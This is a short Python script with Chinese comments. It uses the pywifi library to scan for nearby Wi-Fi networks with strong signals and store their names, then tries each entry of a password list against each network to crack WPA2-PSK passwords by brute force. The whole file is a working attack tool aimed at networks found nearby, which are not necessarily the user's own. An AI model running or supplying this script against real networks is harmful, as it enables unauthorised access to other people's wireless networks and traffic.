import pywifi
import time
import json
from pywifi import const
Codepath = r'C:\Users\38280\Desktop\test.txt'
Spath = r'C:\Users\38280\Desktop\ssid.txt'
Signalfloor = -50

def CrackWifi(password):

    #读入密码本
    CrackWifi.password = password
    #创建一个wifi
    wifi = pywifi.PyWiFi()
    #获取第一个无线网卡
    iface = wifi.interfaces()[0]
    #断开所有链接
    iface.disconnect()
    time.sleep(5)
    #wifi配置文件
    profile = pywifi.Profile()
    profile.auth = const.AUTH_ALG_OPEN  # 身份验证算法，有SHARED和OPEN两种，绝大多数是OPEN类型
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WAP2模式，akm（无线管理密码类型）选WPA2PSK
    profile.cipher = const.CIPHER_TYPE_CCMP  # 加密算法
    #读入扫描到的wifi
    with open(Spath,'r') as load_f:
        load_ssid = json.load(load_f)
    for ssid in load_ssid:
        if iface.status() == const.IFACE_CONNECTED:
            break
        profile.ssid = ssid
    #输出连接状态
        for lines in CrackWifi.password:        #逐行尝试可能的密码
            print('正在尝试:'+ lines)
            profile.key = lines
            profile = iface.add_network_profile(profile)
            iface.connect(profile)
            time.sleep(5)
            if iface.status() == const.IFACE_CONNECTED:
                print("连接成功")
                break
            else:
                print('密码不正确')



#扫描附近wifi
def scan():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    #扫描附近wifi
    print('正在扫描')
    iface.scan()
    time.sleep(3)
    #输出扫描结果
    result = iface.scan_results()
    myssid = []
    #存储wifi的名称（ssid）
    for i in range(len(result)):
        if result[i].signal > Signalfloor: #筛选信号好的wifi
            myssid.append(result[i].ssid)
    print(myssid)
    # 将数据转化为标准json格式，方便存储
    Json_ssids = json.dumps(myssid, ensure_ascii=False)
    print(Json_ssids)
    # 将扫描结果序列化
    with open(Spath, 'w',encoding='utf-8') as f:
        f.write(Json_ssids)
    return Json_ssids

def Readpassword():
    with open(Codepath,'r') as f: #读取密码本
        password = f.readlines()
    return password

scan()
password = Readpassword()
CrackWifi(password)